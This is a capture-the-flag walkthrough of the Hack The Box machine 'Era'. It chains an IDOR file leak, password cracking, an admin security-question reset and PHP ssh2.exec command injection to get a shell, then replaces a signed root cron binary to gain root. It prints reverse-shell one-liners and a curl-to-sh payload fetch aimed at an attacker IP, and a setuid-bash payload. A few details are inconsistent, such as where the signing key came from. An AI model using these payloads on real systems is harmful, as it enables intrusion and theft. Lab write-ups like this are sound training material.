---
icon: apple-whole
---

# HTB-ERA

<figure><img src="../../../../.gitbook/assets/image (515).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/_- visual selection (2) (1).png" alt=""><figcaption></figcaption></figure>

### Reconnaissance

#### Nmap Scan

```bash
nmap -A -p- 10.10.11.79 blah blah blah
```

**Results:**

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://era.htb/
```

**Analysis:**

* Port 21 (FTP) running vsftpd 3.0.5
* Port 80 (HTTP) running nginx with redirect to `era.htb`
* **No SSH port 22** - unusual for HTB machines
* Need to add `era.htb` to `/etc/hosts`

#### Hosts File Configuration

```bash
echo "10.10.11.79 era.htb" | sudo tee -a /etc/hosts
```

***

### Web Enumeration

#### Main Website (era.htb)

<figure><img src="../../../../.gitbook/assets/image (518).png" alt=""><figcaption></figcaption></figure>

Visiting `http://era.htb` shows a generic design company website with:

* Company portfolio
* Employee names (Maria, Oliver, etc.)
* Contact form
* No immediate vulnerabilities

#### Subdomain Enumeration

Since a domain is configured, we check for subdomains:

```bash
ffuf -w /usr/share/amass/wordlists/bitquark_subdomains_top100K.txt \
  -H "Host: FUZZ.era.htb" \
  -u http://era.htb/ \
  -mc 200
```

**Output:**

```
file                    [Status: 200, Size: 6765, Words: 2608, Lines: 234]
```

<figure><img src="../../../../.gitbook/assets/image (517).png" alt=""><figcaption></figcaption></figure>

**Discovery:** Found subdomain `file.era.htb`

Add to hosts file:

```bash
echo "10.10.11.79 file.era.htb" | sudo tee -a /etc/hosts
```

***

### File Storage Application (file.era.htb)

<figure><img src="../../../../.gitbook/assets/image (516).png" alt=""><figcaption></figcaption></figure>

#### Initial Access

Visiting `http://file.era.htb` reveals:

* **Era Storage** - A file management system
* Login page with two options:
  1. Username/Password authentication
  2. Security question authentication
* No visible registration link

#### Finding Registration Page

Testing common endpoints:

```bash
curl http://file.era.htb/register.php
```

**Success!** Found hidden registration endpoint at `/register.php`

<figure><img src="../../../../.gitbook/assets/image (519).png" alt=""><figcaption></figcaption></figure>

#### Account Registration

1. Navigate to `http://file.era.htb/register.php`
2. Register a new account with arbitrary credentials
3. Login successfully at `http://file.era.htb/login.php`

***

### Exploitation Phase 1: IDOR Vulnerability

#### File Upload Testing

<figure><img src="../../../../.gitbook/assets/image (520).png" alt=""><figcaption></figcaption></figure>

After logging in:

1. Upload a test file via the upload interface
2. Receive download link: [`http://file.era.htb/download.php?id=7188`](http://file.era.htb/download.php?id=2308)
3. Notice the sequential ID parameter

#### IDOR Discovery

The `id` parameter suggests potential **Insecure Direct Object Reference (IDOR)**.

Create ID wordlist:

```bash
seq 0 10000 > id.txt
```

#### Fuzzing File IDs

```bash
ffuf -u "http://file.era.htb/download.php?id=FUZZ" \
  -w id.txt \
  -mc 200 \
  -H "Cookie: PHPSESSID=YOUR_SESSION_COOKIE" \
  -fs 7188

```

**Important:** Replace `YOUR_SESSION_COOKIE` with your actual session cookie from browser (F12 → Application → Cookies)

**Results:**

<figure><img src="../../../../.gitbook/assets/image (521).png" alt=""><figcaption></figcaption></figure>

```
54  [Status: 200, Size: 2006697]  # site-backup-30-08-24.zip
150 [Status: 200, Size: 2746]      # signing.zip
```

#### Downloading Sensitive Files

```bash
# Download backup file
curl "http://file.era.htb/download.php?id=54&dl=true" \
  -H "Cookie: PHPSESSID=YOUR_SESSION_COOKIE" \
  -o site-backup-30-08-24.zip

# Download signing files
curl "http://file.era.htb/download.php?id=150&dl=true" \
  -H "Cookie: PHPSESSID=YOUR_SESSION_COOKIE" \
  -o signing.zip
```

***

### Database Analysis

#### Extracting Database

```bash
unzip site-backup-30-08-24.zip
cd backup
```

#### SQLite Database Enumeration

```bash
sqlite3 filedb.sqlite
```

**Commands:**

```sql
.tables
SELECT user_name, user_password FROM users;
```

**Output:**

<figure><img src="../../../../.gitbook/assets/image (522).png" alt=""><figcaption></figcaption></figure>

```
user_id|user_name|user_password|security_answer1|security_answer2|security_answer3
1|admin_ef01cab31aa|$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC|Maria|Oliver|Ottawa
2|eric|$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm|||
3|veronica|$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK|||
4|yuri|$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.|||
5|john|$2a$10$iccCEz6.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6|||
6|ethan|$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC|||
```

**Key Findings:**

* Admin username: `admin_ef01cab31aa`
* Admin security answers: `Maria`, `Oliver`, `Ottawa`
* Password hashes for multiple users

***

### Password Cracking

#### Extract Hashes

```bash
cat > hashes.txt << EOF
$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm
$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.
EOF
```

#### Hashcat Cracking

```bash
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Results:**

```
eric:america
yuri:mustang
```

***

### FTP Access

#### Login with Cracked Credentials

```bash
ftp era.htb
# Username: yuri
# Password: mustang
```

**Available Directories:**

```
drwxr-xr-x    2 0        0            4096 Jul 22 08:42 apache2_conf
drwxr-xr-x    3 0        0            4096 Jul 22 08:42 php8.1_conf
```

<figure><img src="../../../../.gitbook/assets/image (523).png" alt=""><figcaption></figcaption></figure>

#### Download FTP Contents

```bash
mkdir ftp_loot
cd ftp_loot

# Download apache configs
ftp> cd apache2_conf
ftp> mget *

# Download PHP modules
ftp> cd ../php8.1_conf
ftp> mget *
```

**Key Discovery in `php8.1_conf/`:**

```
-rw-r--r--    1 0        0          313912 Dec 08  2024 ssh2.so
-rw-r--r--    1 0        0          284936 Dec 08  2024 phar.so
```

**Analysis:** The presence of `ssh2.so` indicates **SSH2 PHP wrapper is enabled** - this will be critical for exploitation.

***

### Exploitation Phase 2: Admin Account Takeover

#### Code Review - reset.php Vulnerability

Examining `backup/reset.php`:

```php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $username = trim($_POST['username'] ?? '');
    $new_answer1 = trim($_POST['new_answer1'] ?? '');
    $new_answer2 = trim($_POST['new_answer2'] ?? '');
    $new_answer3 = trim($_POST['new_answer3'] ?? '');

    $query = "UPDATE users SET security_answer1 = ?, security_answer2 = ?, security_answer3 = ? WHERE user_name = ?";
    // NO AUTHENTICATION CHECK!
}
```

**Vulnerability:** The reset functionality doesn't verify if the authenticated user owns the account being reset!

#### Resetting Admin Security Questions

```bash
curl -X POST "http://file.era.htb/reset.php" \
  -H "Cookie: PHPSESSID=YOUR_SESSION_COOKIE" \
  -d "username=admin_ef01cab31aa&new_answer1=pwned&new_answer2=pwned&new_answer3=pwned"
```

**What this does:**

* Overwrites admin's security answers to `pwned, pwned, pwned`
* No verification that we own this account
* Classic IDOR vulnerability

#### Admin Login via Security Questions

```bash
curl -X POST "http://file.era.htb/security_login.php" \
  -d "username=admin_ef01cab31aa&q1=pwned&q2=pwned&q3=pwned" \
  -c admin_cookie.txt \
  -v
```

**Extract admin session cookie:**

```bash
cat admin_cookie.txt
# PHPSESSID=ADMIN_SESSION_VALUE
```

***

### Exploitation Phase 3: PHP Wrapper RCE

#### Code Review - download.php Hidden Feature

Examining `backup/download.php`:

```php
} elseif ($_GET['show'] === "true" && $_SESSION['erauser'] === 1) {
    $format = isset($_GET['format']) ? $_GET['format'] : '';
    $file = $fetched[0];

    if (strpos($format, '://') !== false) {
        $wrapper = $format;
        header('Content-Type: application/octet-stream');
    }

    $file_content = fopen($wrapper ? $wrapper . $file : $file, 'r');
}
```

**Vulnerability Analysis:**

* Hidden `show=true` parameter only available to admin (`erauser === 1`)
* `format` parameter accepts PHP stream wrappers
* Combined with `ssh2.so` module → **Remote Code Execution**

#### PHP SSH2 Wrapper Explained

The `ssh2.exec://` wrapper syntax:

```
ssh2.exec://user:password@host:port/command
```

**Example:**

```
ssh2.exec://eric:america@127.0.0.1/whoami
```

This connects via SSH to localhost and executes `whoami`.

***

### Getting Initial Shell

#### Method 1: Direct Reverse Shell

**Setup listener:**

```bash
nc -lvnp 4444
```

**Trigger payload (with admin cookie):**

```bash
curl "http://file.era.htb/download.php?id=54&show=true&format=ssh2.exec://eric:america@127.0.0.1/bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.70%2F4444%200%3E%261%27" \
  -H "Cookie: PHPSESSID=ADMIN_SESSION_COOKIE"
```

#### Method 2: Shell Script (Recommended)

**Create shell script:**

```bash
cat > shell.sh << 'EOF'
#!/bin/bash
mkfifo /tmp/s; /bin/sh </tmp/s | nc 10.10.14.70 4444 >/tmp/s; rm /tmp/s
EOF
```

**Start HTTP server:**

```bash
python3 -m http.server 80
```

**Start listener:**

```bash
nc -lvnp 4444
```

**Trigger payload:**

```bash
curl "http://file.era.htb/download.php?id=54&show=true&format=ssh2.exec://eric:america@127.0.0.1/curl%20-s%20http://10.10.14.70/shell.sh|sh" \
  -H "Cookie: PHPSESSID=ADMIN_SESSION_COOKIE"
```

**Success! Shell as `eric` user received.**

***

### Shell Upgrade

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
export SHELL=/bin/bash
# Ctrl+Z
stty raw -echo; fg
# Press Enter twice
```

***

### User Flag

```bash
cat /home/eric/user.txt
```

***

### Privilege Escalation

#### Initial Enumeration

```bash
id
```

**Output:**

```
uid=1000(eric) gid=1000(eric) groups=1000(eric),1001(devs)
```

**Key Finding:** User `eric` is member of `devs` group.

#### Finding Writable Files

```bash
find / -group devs 2>/dev/null
```

**Output:**

```
/opt/AV
/opt/AV/periodic-checks
/opt/AV/periodic-checks/monitor
/opt/AV/periodic-checks/status.log
```

#### Inspecting Suspicious Binary

```bash
ls -la /opt/AV/periodic-checks/
```

**Output:**

```
drwxrwxr-- 2 root devs  4096 Nov 10 22:36 .
drwxrwxr-- 3 root devs  4096 Jul 22 08:42 ..
-rwxrw---- 1 root devs 16544 Nov 10 22:36 monitor
-rw-rw---- 1 root devs   103 Nov 10 22:36 status.log
```

**Analysis:**

* `monitor` binary owned by `root` but writable by `devs` group
* `status.log` gets updated regularly → suggests cronjob
* We can replace the binary!

#### Monitoring Execution

```bash
watch -n 1 cat /opt/AV/periodic-checks/status.log
```

**Output:**

```
[*] System scan initiated...
[*] No threats detected. Shutting down...
[SUCCESS] No threats detected.
```

**Confirmed:** Root cronjob executes `monitor` periodically.

***

### Binary Signature Bypass

#### Naive Approach (Fails)

```bash
# Backup original
cp /opt/AV/periodic-checks/monitor /tmp/monitor.bak

# Try simple bash script
echo '#!/bin/bash\nchmod +s /bin/bash' > /opt/AV/periodic-checks/monitor
chmod +x /opt/AV/periodic-checks/monitor
```

**Wait and check log:**

```bash
cat /opt/AV/periodic-checks/status.log
```

**Output:**

```
objcopy: /opt/AV/periodic-checks/monitor: file format not recognized
[ERROR] Executable not signed. Tampering attempt detected. Skipping.
```

**Analysis:** The binary must be:

1. A valid ELF executable
2. Digitally signed with `.text_sig` section

#### Analyzing Original Binary

```bash
file /tmp/monitor.bak
```

**Output:**

```
monitor: ELF 64-bit LSB pie executable, x86-64
```

**Check for signature section:**

```bash
readelf -S /tmp/monitor.bak | grep -i sig
```

**Output:**

```
[28] .text_sig         PROGBITS         0000000000000000  00003040
```

**Confirmed:** Binary has custom `.text_sig` section containing cryptographic signature.

***

### Signing Our Payload

#### Extract Signing Keys (From FTP)

Recall we downloaded `signing.zip` earlier:

```bash
unzip signing.zip
```

**Contents:**

```
key.pem       # RSA private key
x509.genkey   # OpenSSL configuration
```

**Inspect key:**

```bash
openssl rsa -in key.pem -check
```

**Output:**

```
RSA key ok
writing RSA key
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAo...
-----END PRIVATE KEY-----
```

#### Create Malicious Binary

```bash
cat > pwn.c << 'EOF'
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash");
    return 0;
}
EOF
```

**Compile statically:**

```bash
gcc -static -o pwn pwn.c
```

#### Sign the Binary

The signing tool expects `linux-elf-binary-signer`. Download and use:

```bash
# Extract signature from original binary
objcopy --dump-section .text_sig=sig /tmp/monitor.bak

# Add signature to our binary
objcopy --add-section .text_sig=sig pwn monitor_signed
```

**Alternative (if elf-sign tool available):**

```bash
./elf-sign sha256 key.pem key.pem pwn monitor_signed
```

#### Replace Binary

```bash
# Restore original first
cp /tmp/monitor.bak /opt/AV/periodic-checks/monitor

# Upload our signed binary
curl -O http://10.10.14.70/monitor_signed
cp monitor_signed /opt/AV/periodic-checks/monitor
chmod +x /opt/AV/periodic-checks/monitor
```

#### Wait for Execution

```bash
watch -n 1 'ls -la /tmp/rootbash 2>/dev/null'
```

**Success indicator in log:**

```bash
cat /opt/AV/periodic-checks/status.log
```

**Output:**

```
[*] System scan initiated...
[*] No threats detected. Shutting down...
[SUCCESS] No threats detected.
```

***

### Root Shell

```bash
/tmp/rootbash -p
```

**Output:**

```
rootbash-5.1# id
uid=1000(eric) gid=1000(eric) euid=0(root) egid=0(root) groups=0(root),1000(eric),1001(devs)
```

#### Root Flag

```bash
cat /root/root.txt
```

***

### Attack Chain Summary

```
1. Subdomain Enumeration → file.era.htb
2. IDOR in download.php → Leaked database + source code
3. Password cracking → eric:america, yuri:mustang
4. FTP access → Discovered ssh2.so module
5. IDOR in reset.php → Reset admin security questions
6. Security question login → Admin access
7. PHP ssh2.exec wrapper → RCE as eric
8. Group membership (devs) → Writable /opt/AV/periodic-checks/monitor
9. Binary replacement + signature bypass → Root access
```

***

<figure><img src="../../../../.gitbook/assets/complete (36).gif" alt=""><figcaption></figcaption></figure>
